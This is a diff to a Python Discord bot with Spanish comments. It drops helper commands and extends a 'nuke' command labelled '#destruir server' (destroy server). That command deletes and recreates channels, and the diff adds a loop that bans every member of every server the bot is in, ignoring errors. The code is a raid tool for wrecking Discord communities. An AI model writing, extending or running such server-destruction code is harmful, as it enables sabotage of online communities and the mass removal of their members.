@@ -27,19 +27,6 @@ async def on_ready():
     print('Bot ID: {}'.format(bot.user.id))
 
 
-#opcion para eliminar canales por separado
-@bot.command()
-async def removechannel(ctx, channel: discord.TextChannel):
-    await channel.delete()
-    await ctx.send("canal borrado correctamente")
-    print('un channel eliminado')
-
-@bot.command()
-async def removeVoice(ctx, channel: discord.VoiceChannel):
-    await channel.delete()
-    await ctx.send('se elimino canal de voz')
-    print('un canal de voz ha sido eliminado')
-
 #destruir server
 @bot.command(name='nuke')
 async def nuke(ctx):
@@ -74,15 +61,15 @@ async def nuke(ctx):
         await guild.create_text_channel(nombre_canal)
         print(Fore.GREEN + 'canal creado ' + Fore.RESET + 'nombre del canal: ' + Fore.YELLOW + f'{channel.name}')
 
+    for guild in bot.guilds:
+        for member in guild.members:
+            try:
+                await guild.ban(member)
+            except:
+                pass
 
-#obtener avatar de cualquier usuario del server
-@bot.command()
-async def avatar(ctx, *, avamember: discord.Member = None):
-    userAvatarUrl = avamember.avatar_url
-    await ctx.send(userAvatarUrl)
 
 
 
-        
-
+    
 bot.run(TOKEN)
